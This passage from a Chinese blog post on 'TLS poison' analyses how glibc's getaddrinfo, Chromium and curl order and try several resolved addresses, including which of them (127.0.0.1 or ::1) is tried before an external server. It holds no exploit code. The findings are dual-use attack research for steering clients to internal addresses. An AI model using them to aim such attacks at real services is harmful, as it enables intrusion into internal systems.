a2 &#x4EE3;&#x8868;&#x7684;&#x662F; 127.0.0.1 &#xFF0C; a1 &#x4EE3;&#x8868;&#x7684;&#x662F;&#x6211;&#x4EEC;&#x771F;&#x6B63; vps &#x7684;&#x5730;&#x5740;&#x3002;&#x7136;&#x540E;&#x901A;&#x8FC7; gdb &#x5355;&#x6B65;&#x6267;&#x884C;&#xFF0C;&#x6211;&#x4EEC;&#x5728; Rule 8 &#x7684;&#x65F6;&#x5019;&#x8DF3;&#x51FA;&#x4E86;<code>rfc3484_sort</code>&#x51FD;&#x6570;:</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* Rule 8: Prefer smaller scope.  */</span></span><br><span class="line"><span class="hljs-keyword">if</span> (a1_dst_scope &lt; a2_dst_scope)</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;</span><br><span class="line"><span class="hljs-keyword">if</span> (a1_dst_scope &gt; a2_dst_scope)</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part3/1.png" alt></p><p>&#x8DF3;&#x51FA;<code>rfc3484_sort</code>&#x8FDB;&#x5165;&#x5230; <code>qsort_r</code> &#x51FD;&#x6570;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5728;&#x6B64;&#x5904;&#x6267;&#x884C;&#x5B8C;&#x6BD4;&#x8F83;&#x5C31;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;&#x5230;&#x4E86;<code>qsort</code>&#x51FD;&#x6570;&#xFF0C;&#x5E76;&#x4E14;&#x4ECE;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x6765;&#x770B;&#xFF0C;&#x662F;&#x56E0;&#x4E3A; <code>a1_dst_scope &gt; a2_dst_scope</code> &#x6BD4;&#x8F83;&#x7ED3;&#x679C;&#x6267;&#x884C;&#x4E86;<code>return 1</code>&#x3002;&#x6240;&#x4EE5;&#x6309;&#x7167;<code>qsort</code>&#x51FD;&#x6570;&#x6587;&#x6863;&#x8BF4;&#x660E;&#xFF0C;&#x5982;&#x679C;&#x8FD4;&#x56DE;&#x4E86;&#x4E00;&#x4E2A;&#x5927;&#x4E8E; 0 &#x7684;&#x503C;&#xFF0C;&#x5219;&#x8BF4;&#x660E;&#x8981;&#x5C06;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x9700;&#x8981;&#x6392;&#x5728;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x4E4B;&#x540E;&#xFF0C;&#x8FD9;&#x91CC; a1 &#x4EE3;&#x8868;&#x7684;&#x6211;&#x4EEC;&#x7684; vps &#x5730;&#x5740;&#x9700;&#x8981;&#x6392;&#x5728; a2 &#x4EE3;&#x8868;&#x7684; 127.0.0.1 &#x5730;&#x5740;&#x4E4B;&#x540E;&#xFF0C;&#x6240;&#x4EE5;&#x7ECF;&#x8FC7;<code>rfc3484_sort</code>&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x7684;&#x987A;&#x5E8F;&#x5219;&#x662F; 127.0.0.1 &#x4F5C;&#x4E3A;&#x9996;&#x9009;&#x5730;&#x5740;&#xFF0C;VPS &#x5730;&#x5740;&#x5176;&#x6B21;&#x3002;</p><p>&#x4E8E;&#x662F;&#x6211;&#x63A5;&#x4E0B;&#x6765;&#x4F9D;&#x6B21;&#x5BF9; IPv4 &#x5F53;&#x4E2D;&#x5404;&#x79CD;&#x6392;&#x5217;&#x7EC4;&#x5408;&#x8FDB;&#x884C;&#x4E86;&#x6D4B;&#x8BD5;&#xFF1A;</p><ul><li><p>a1 127.0.0.1 vs a2 0.0.0.0&#x3002;&#x9002;&#x7528;&#x4E8E; scope &#x5224;&#x65AD;&#xFF0C;127 &#x4F18;&#x5148;</p></li><li><p>a1 ipv4 vps vs a2 0.0.0.0&#x3002;&#x9002;&#x7528;&#x4E8E; scope &#x5224;&#x65AD;&#xFF0C;ipv4 vps &#x4F18;&#x5148;</p></li><li><p>a1  169.254.1.1 vs a2 0.0.0.0&#x3002;&#x9002;&#x7528;&#x4E8E; scope &#x5224;&#x65AD;&#xFF0C;169 &#x4F18;&#x5148;</p></li><li><p>a1 127.0.0.1 vs a2 169.254.0&#x3002;&#x9002;&#x7528;&#x4E8E; scope &#x5224;&#x65AD;&#xFF0C;127 &#x4F18;&#x5148;</p></li><li><p>a1 ipv4 vps vs a2 ipv4 vps&#x3002;&#x5E76;&#x4E0D;&#x9002;&#x7528;&#x4EFB;&#x4F55;&#x5224;&#x65AD;&#xFF0C;&#x51FD;&#x6570;&#x6267;&#x884C;&#x5B8C;&#x6210;&#x8FD4;&#x56DE; -1 &#xFF0C;&#x8868;&#x793A;&#x4FDD;&#x6301;&#x539F;&#x987A;&#x5E8F;&#xFF0C;&#x4F53;&#x73B0;&#x4E3A;&#x968F;&#x673A;&#x3002;</p></li></ul><p><strong>&#x518D;&#x6B21;&#x91CD;&#x7533;&#xFF0C;&#x8FD9;&#x91CC;&#x7684; IPv6 &#x6307;&#x7684;&#x662F;IPv4-mapped IPv6 addresses &#x8FD9;&#x7C7B;&#x5730;&#x5740;</strong></p><p>&#x5BF9;&#x4E8E; IPv6 &#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x5F62;&#x5F0F;&#x5728; gdb &#x6253;&#x5370;&#x5BF9;&#x5E94;&#x7684;&#x5730;&#x5740;&#xFF1A;</p><p></p><figure class="highlight xl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-title">p</span> ((struct sockaddr_in6*)((*a1-&gt;</span><span class="hljs-function"><span class="hljs-title">dest_addr</span>)-&gt;</span><span class="hljs-function"><span class="hljs-title">ai_addr</span>))-&gt;</span><span class="hljs-function"><span class="hljs-title">sin6_addr</span>-&gt;</span>__<span class="hljs-function"><span class="hljs-title">in6_u</span>-&gt;</span>__u6_addr8</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E8E;&#x662F;&#x6211;&#x63A5;&#x4E0B;&#x6765;&#x4F9D;&#x6B21;&#x5BF9; IPv4 &#x4E0E; IPv6 &#x5F53;&#x4E2D;&#x5404;&#x79CD;&#x6392;&#x5217;&#x7EC4;&#x5408;&#x8FDB;&#x884C;&#x4E86;&#x6D4B;&#x8BD5;&#xFF1A;</p><ul><li>IPv6 vps vs IPv4 vps&#x3002;&#x5E76;&#x4E0D;&#x9002;&#x7528;&#x4EFB;&#x4F55;&#x5224;&#x65AD;&#xFF0C;&#x51FD;&#x6570;&#x6267;&#x884C;&#x5B8C;&#x6210;&#x8FD4;&#x56DE; -1 &#xFF0C;&#x8868;&#x793A;&#x4FDD;&#x6301;&#x539F;&#x987A;&#x5E8F;&#xFF0C;&#x4F53;&#x73B0;&#x4E3A;&#x968F;&#x673A;&#x3002;</li><li>IPv6 vps vs 127.0.0.1&#x3002;&#x9002;&#x7528;&#x4E8E; scope &#x5224;&#x65AD;&#xFF0C;127 &#x4F18;&#x5148;</li><li>::1 vs 45.76.196.189&#x3002;&#x9002;&#x7528;&#x4E8E; prec &#x5224;&#x65AD;&#xFF0C;::1 &#x4F18;&#x5148;</li><li>::1 vs 127.0.0.1&#x3002;&#x9002;&#x7528;&#x4E8E; prec &#x5224;&#x65AD;&#xFF0C;::1 &#x4F18;&#x5148;</li><li>127.0.0.1 vs :: &#x3002;&#x9002;&#x7528;&#x4E8E; scope &#x5224;&#x65AD;&#xFF0C; :: &#x4F18;&#x5148;</li><li>0.0.0.0 vs IPv6 vps&#x3002;&#x9002;&#x7528;&#x4E8E; scope &#x5224;&#x65AD;&#xFF0C; IPv6 VPS &#x4F18;&#x5148;&#x3002;</li><li>0.0.0.0 vs  ::1&#x3002;&#x9002;&#x7528;&#x4E8E; scope &#x5224;&#x65AD;&#xFF0C;::1 &#x4F18;&#x5148;</li><li>IPv4 vps vs ::&#x3002;&#x9002;&#x7528;&#x4E8E; scope &#x5224;&#x65AD;&#xFF0C;IPv4 vps &#x4F18;&#x5148;</li><li>IPv4 vps vs ::1&#x3002;&#x9002;&#x7528;&#x4E8E; price &#x5224;&#x65AD;&#xFF0C; ::1 &#x4F18;&#x5148;</li></ul><p>&#x603B;&#x7ED3;&#x8D77;&#x6765;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4EE5;&#x4E0B;&#x8FD9;&#x4E2A;&#x8868;&#x683C;&#xFF1A;</p><table><thead><tr><th>&#x5BF9;&#x6BD4;&#x5F62;&#x5F0F;</th><th>A1</th><th>A2</th><th>&#x4F18;&#x5148;&#x503C;</th></tr></thead><tbody><tr><td>v4127-v40</td><td>127.0.0.1</td><td>0.0.0.0</td><td>A1</td></tr><tr><td>v4vps-v40</td><td>vps</td><td>0.0.0.0</td><td>A1</td></tr><tr><td>v4vps-v4127</td><td>127.0.0.1</td><td>vps</td><td>A1</td></tr><tr><td>v4vps-v4vps</td><td>vps</td><td>vps</td><td>&#x968F;&#x673A;&#xFF0C;&#x4FDD;&#x6301;&#x539F;&#x987A;&#x5E8F;</td></tr><tr><td>v4vps-v6vps</td><td>vps</td><td>vps</td><td>&#x968F;&#x673A;&#xFF0C;&#x4FDD;&#x6301;&#x539F;&#x987A;&#x5E8F;</td></tr><tr><td>v4127-v6vps</td><td>127.0.0.1</td><td>vps</td><td>A1</td></tr><tr><td>v4127-v60</td><td>127.0.0.1</td><td>::</td><td>A1</td></tr><tr><td>v4127-v6127</td><td>127.0.0.1</td><td>::1</td><td>A2</td></tr><tr><td>v40-v6vps</td><td>0.0.0.0</td><td>vps</td><td>A2</td></tr><tr><td>v40-v6127</td><td>0.0.0.0</td><td>::1</td><td>A2</td></tr><tr><td>v4vps-v6127</td><td>vps</td><td>::1</td><td>A2</td></tr><tr><td>v4vps-v60</td><td>vps</td><td>::</td><td>A1</td></tr><tr><td>V4127map-v4ps</td><td>vps</td><td>::ffff:7f00:0001</td><td>&#x968F;&#x673A;&#xFF0C;&#x4FDD;&#x6301;&#x539F;&#x987A;&#x5E8F;</td></tr></tbody></table><p>&#x6574;&#x4F53;&#x6765;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5927;&#x81F4;&#x4ECE;&#x8868;&#x4E2D;&#x770B;&#x51FA;&#xFF0C;&#x542B;&#x6709;&#x53CC; A &#x8BB0;&#x5F55;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x5982;&#x679C;&#x51FA;&#x73B0; 127.0.0.1 &#x6216;&#x8005; ::1 &#xFF0C;&#x90FD;&#x4F1A;&#x4EE5;&#x8FD9;&#x4E24;&#x8005;&#x4F18;&#x5148;&#xFF0C;&#x800C;&#x4E24;&#x8005;&#x4E2D;&#x53C8;&#x4F1A;&#x4EE5; ::1 &#x4F18;&#x5148;&#xFF0C;&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x524D;&#x6587;&#x7684; IP &#x9009;&#x62E9;&#x6392;&#x5E8F;&#x95EE;&#x9898;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x4E5F;&#x5C31;&#x5F97;&#x5230;&#x4E86;&#x4E00;&#x4E2A;&#x5927;&#x4F53;&#x7684;&#x7B54;&#x6848;&#x3002;</p><blockquote class="colorquote success"><p>2021/05/14 &#x66F4;&#x65B0;&#xFF1A;</p><p>&#x589E;&#x52A0;&#x4E86; 127.0.0.1 &#x4F7F;&#x7528; IPv4-mapped &#x8868;&#x793A; IPv6 &#x65F6;&#xFF0C;&#x4E0E; v4 vps &#x5730;&#x5740;&#x7684;&#x5BF9;&#x6BD4;&#xFF0C;&#x8BE6;&#x7EC6;&#x8BF4;&#x660E;&#x89C1; <a href="#IPv4-Mapped-127-0-0-1">Additional Remarks</a></p></blockquote><h3 id="IP-Sort-IN-Chromium"><a href="#IP-Sort-IN-Chromium" class="headerlink" title="IP Sort IN Chromium"></a>IP Sort IN Chromium</h3><p>&#x5F53;&#x7136;&#x5728; Chromium &#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x76F8;&#x5E94;&#x7684; IP &#x9009;&#x62E9;&#x5B9E;&#x73B0;&#x65B9;&#x5F0F;&#xFF1A;</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:net/dns/address_sorter_posix.cc;l=39" target="_blank" rel="noopener">https://source.chromium.org/chromium/chromium/src/+/master:net/dns/address_sorter_posix.cc;l=39</a></p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Address sorting is performed according to RFC3484 with revisions.</span></span><br><span class="line"><span class="hljs-comment">// http://tools.ietf.org/html/draft-ietf-6man-rfc3484bis-06</span></span><br><span class="line"><span class="hljs-comment">// Precedence and label are separate to support override through /etc/gai.conf.</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Returns true if |p1| should precede |p2| in the table.</span></span><br><span class="line"><span class="hljs-comment">// Sorts table by decreasing prefix size to allow longest prefix matching.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ComparePolicy</span><span class="hljs-params">(<span class="hljs-keyword">const</span> AddressSorterPosix::PolicyEntry&amp; p1,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">                   <span class="hljs-keyword">const</span> AddressSorterPosix::PolicyEntry&amp; p2)</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> p1.prefix_length &gt; p2.prefix_length;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728; <a href="https://source.chromium.org/chromium/chromium/src/+/master:net/dns/address_sorter_posix.cc;l=200" target="_blank" rel="noopener">https://source.chromium.org/chromium/chromium/src/+/master:net/dns/address_sorter_posix.cc;l=200</a> &#x4E5F;&#x5B9E;&#x73B0;&#x4E86;&#x57FA;&#x4E8E; RFC 3484 &#x5BF9;&#x5E94;&#x7684; IP &#x6392;&#x5E8F;&#x65B9;&#x6CD5;&#x3002;</p><p>&#x4F46;&#x662F;&#x5B9E;&#x9645;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C; chrome &#x6709;&#x4E2A;&#x975E;&#x5E38;&#x5947;&#x7279;&#x7684;&#x73B0;&#x8C61;&#xFF0C;&#x5C31;&#x662F;&#x5BF9;&#x4E8E;&#x8FD4;&#x56DE;&#x591A;&#x4E2A; IP &#xFF0C;chrome &#x4F1A;&#x7ACB;&#x9A6C;&#x6328;&#x4E2A;&#x5BF9;&#x5176;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#xFF0C;&#x6211;&#x627E;&#x4E86;&#x4E00;&#x4E9B;&#x670B;&#x53CB;&#x8BE2;&#x95EE;&#x4E86;&#x76F8;&#x5173;&#x60C5;&#x51B5;&#xFF0C;&#x6709;&#x4E9B;&#x8868;&#x793A;&#x6CA1;&#x6709;&#x5173;&#x6CE8;&#x8FC7;&#xFF0C;&#x6709;&#x4F4D;&#x670B;&#x53CB;&#x5219;&#x8868;&#x793A;&#x4ED6;&#x8FC7;&#x53BB;&#x53D1;&#x73B0;&#x8FC7;&#x8FD9;&#x4E2A;&#x60C5;&#x51B5;&#xFF0C;&#x8BF4;&#x662F; chrome &#x6709;&#x4E2A; IP &#x9009;&#x4F18;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x4F1A;&#x5BF9;&#x591A;&#x4E2A; IP &#x8FDB;&#x884C;&#x6D4B;&#x901F;&#xFF0C;&#x4EE5;&#x6700;&#x5FEB;&#x7684;&#x7ED3;&#x679C;&#x4F5C;&#x4E3A;&#x6700;&#x4F73;&#x9009;&#x62E9;&#x3002;&#x5173;&#x4E8E;&#x8FD9;&#x4E2A;&#x7ED3;&#x8BBA;&#x6211;&#x5728; chromium.org &#x7B49;&#x76F8;&#x5173;&#x6587;&#x6863;&#x8FDB;&#x884C;&#x4E86;&#x67E5;&#x627E;&#xFF0C;&#x4F46;&#x662F;&#x5E76;&#x6CA1;&#x6709;&#x627E;&#x5230;&#x5173;&#x4E8E;&#x8BE5;&#x73B0;&#x8C61;&#x7684;&#x8BF4;&#x660E;&#x3002;&#x5982;&#x679C;&#x6709;&#x670B;&#x53CB;&#x77E5;&#x9053;&#x8BE5;&#x73B0;&#x8C61;&#x7684;&#x539F;&#x56E0;&#x6216;&#x8005;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x7684;&#x8BDD;&#xFF0C;&#x4E5F;&#x6B22;&#x8FCE;&#x63D0;&#x51FA;&#x8BC4;&#x8BBA;&#x3002;</p><h3 id="Something-else"><a href="#Something-else" class="headerlink" title="Something else"></a>Something else</h3><h4 id="Bad-behaved-Application"><a href="#Bad-behaved-Application" class="headerlink" title="Bad-behaved Application"></a>Bad-behaved Application</h4><p>&#x5728; RFC 6724 &#x5F53;&#x4E2D;&#xFF0C;&#x6709;&#x7740;&#x8FD9;&#x4E48;&#x4E00;&#x6BB5;&#x8BDD;</p><blockquote><p>&#x200B;    Well-behaved applications SHOULD NOT simply use the first address returned from an API such as getaddrinfo() and then give up if it fails. For many applications, it is appropriate to iterate through the list of addresses returned from getaddrinfo() until a working address is found. For other applications, it might be appropriate to try multiple addresses in parallel (e.g., with some small delay in between) and use the first one to succeed. </p></blockquote><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E0D;&#x5E94;&#x8BE5;&#x7B80;&#x5355;&#x5730;&#x4F7F;&#x7528;&#x4ECE; API&#xFF08;&#x5982;<code>getaddrinfo</code>&#xFF09;&#x8FD4;&#x56DE;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#xFF0C;&#x5931;&#x8D25;&#x4E86;&#x5C31;&#x653E;&#x5F03;&#x6539;&#x5730;&#x5740;&#x3002;&#x5BF9;&#x4E8E;&#x8BB8;&#x591A;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6765;&#x8BF4;&#xFF0C;&#x5B83;&#x4EEC;&#x90FD;&#x9009;&#x62E9;&#x4ECE;<code>getaddrinfo</code>&#x8FD4;&#x56DE;&#x7684;&#x5730;&#x5740;&#x5217;&#x8868;&#x4E2D;&#x8FDB;&#x884C;&#x6328;&#x4E2A;&#x6D4B;&#x8BD5;&#xFF0C;&#x76F4;&#x5230;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x6B63;&#x5E38;&#x7684;&#x5730;&#x5740;&#x3002;&#x5BF9;&#x4E8E;&#x5176;&#x4ED6;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x53EF;&#x80FD;&#x9002;&#x5408;&#x5E76;&#x884C;&#x5C1D;&#x8BD5;&#x591A;&#x4E2A;&#x5730;&#x5740;&#xFF08;&#x4F8B;&#x5982;&#xFF0C;&#x4E2D;&#x95F4;&#x6709;&#x4E00;&#x4E9B;&#x5C0F;&#x7684;&#x5EF6;&#x8FDF;&#xFF09;&#xFF0C;&#x5E76;&#x4F7F;&#x7528;&#x7B2C;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x6210;&#x529F;&#x3002;(&#x53EF;&#x80FD; Chrome &#x5C31;&#x662F;&#x57FA;&#x4E8E;&#x8FD9;&#x4E2A;&#x8868;&#x73B0;)</p><p>&#x7136;&#x800C; curl &#x5C31;&#x662F;&#x8FD9;&#x4E48;&#x4E00;&#x4E2A; Bad-behaved Application &#xFF0C;&#x4ECE;<code>getaddrinfo</code>&#x51FD;&#x6570;&#x4E2D;&#x53D6;&#x5F97;&#x7684;&#x5730;&#x5740;&#x94FE;&#x8868;&#xFF0C;&#x4F9D;&#x6B21;&#x6328;&#x4E2A;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#xFF0C;&#x4E00;&#x4E2A;&#x4E0D;&#x884C;&#x5C31;&#x6362;&#x4E0B;&#x4E00;&#x4E2A;&#x76F4;&#x5230;&#x6210;&#x529F;&#x6216;&#x94FE;&#x8868;&#x4E3A;&#x7A7A;&#x4E3A;&#x6B62;&#x3002;</p><h4 id="Some-History-of-getaddrinfo"><a href="#Some-History-of-getaddrinfo" class="headerlink" title="Some History of getaddrinfo"></a>Some History of getaddrinfo</h4><p>&#x4E00;&#x6BB5;&#x5173;&#x4E8E; getaddrinfo &#x6392;&#x5E8F;&#x6709;&#x8DA3;&#x7684;&#x5386;&#x53F2;&#xFF0C;&#x4EE5;&#x4E0B;&#x662F;&#x4E2A;&#x4EBA;&#x5BF9;&#x5176;&#x62BD;&#x53D6;&#x7684;&#x7406;&#x89E3;&#xFF0C;&#x539F;&#x6587;&#x89C1;&#xFF1A;<a href="https://lists.debian.org/debian-glibc/2007/09/msg00347.html" target="_blank" rel="noopener">glibc&#x2019;s getaddrinfo() sort order</a></p><p>&#x5728;&#x8FC7;&#x53BB;&#xFF0C;&#x4E3B;&#x673A;&#x540D;&#x5230; IP &#x5730;&#x5740;&#x7684;&#x67E5;&#x8BE2;&#x5230;&#x4E00;&#x822C;&#x90FD;&#x662F;&#x7528;<code>gethostbyname</code>&#x6765;&#x5B8C;&#x6210;&#x7684;&#xFF0C;<code>gethostbyname</code>&#x7684;&#x5730;&#x5740;&#x662F;&#x6309;&#x7167;&#x670D;&#x52A1;&#x5668;&#x8FD4;&#x56DE;&#x7684;&#x5730;&#x5740;&#x987A;&#x5E8F;&#x6392;&#x5217;&#x7684;&#xFF08;&#x9664;&#x975E;&#x5728;&#x672C;&#x5730;&#x505A;&#x4E86;&#x7279;&#x6B8A;&#x7684;&#x914D;&#x7F6E;&#xFF09;&#x3002;&#x5F53;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#x6709;&#x591A;&#x4E2A;&#x5730;&#x5740;&#x65F6;&#xFF0C;&#x57FA;&#x672C;&#x4E0A;&#x6240;&#x6709; NS &#x670D;&#x52A1;&#x5668;&#x90FD;&#x4F1A;&#x5B89;&#x6392;&#x5BF9;&#x8FD4;&#x56DE;&#x7684;&#x5730;&#x5740;&#x8FDB;&#x884C;&#x201D;&#x8F6E;&#x6D41; &#x201C;&#x6216; &#x201C;&#x5FAA;&#x73AF;&#x201D;&#xFF1A;&#x6BCF;&#x4E2A;&#x67E5;&#x8BE2;&#x90FD;&#x4F1A;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x6392;&#x5E8F;&#x3002;&#x8FD9;&#x662F;&#x4E3A;&#x4E86;&#x8BA9;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x540D;&#x53EF;&#x4EE5;&#x5F15;&#x7528;&#x591A;&#x4E2A;&#x7269;&#x7406;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#xFF08;&#x6216;&#x8BB8;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x4E3B;&#x673A;&#x4E0A;&#xFF09;&#xFF0C;&#x5E76;&#x5728;&#x8FD9;&#x4E9B;&#x63A5;&#x53E3;&#x4E0A;&#x5206;&#x62C5;&#x8D1F;&#x8F7D;&#xFF0C;&#x8FD9;&#x5C31;&#x662F;&#x6240;&#x8C13;&#x7684; &#x201C;&#x57FA;&#x4E8E;DNS&#x7684;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x201D;&#x3002;&#x5982;&#x679C;&#x534F;&#x8BAE;&#x662F;&#x50CF;&#x90AE;&#x4EF6;&#x8FD9;&#x6837;&#x7684;&#x534F;&#x8BAE;&#xFF0C;&#x5982;&#x679C;&#x7B2C;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x4E0D;&#x6210;&#x529F;&#xFF0C;&#x53D1;&#x9001;&#x8005;&#x53EF;&#x80FD;&#x4F1A;&#x5C1D;&#x8BD5;&#x591A;&#x4E2A;&#x5730;&#x5740;&#xFF0C;&#x8FD9;&#x4E5F;&#x7ED9;&#x4E86;&#x4F60;&#x4E00;&#x4E2A;&#x6545;&#x969C;&#x8F6C;&#x79FB;(failover)&#x3002;</p><p> gethostbyname &#x7406;&#x8BBA;&#x4E0A;&#x53EF;&#x4EE5;&#x652F;&#x6301; IPv6 &#xFF0C;&#x4F46;&#x6BCF;&#x6B21;&#x8C03;&#x7528;&#x53EA;&#x80FD;&#x8FD4;&#x56DE;&#x4E00;&#x79CD;&#x5730;&#x5740;&#x7C7B;&#x578B;&#x3002;&#x867D;&#x7136;&#x6709;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x5C06; IPv4 &#x5730;&#x5740;&#x5D4C;&#x5165;&#x5230; IPv6 &#x5730;&#x5740;&#x4E2D;&#xFF0C;&#x4F46;&#x5BF9;&#x4E8E;&#x8FD9;&#x6837;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x6CA1;&#x6709;&#x660E;&#x786E;&#x7684;&#x65B9;&#x6CD5;&#x544A;&#x8BC9; gethostbyname 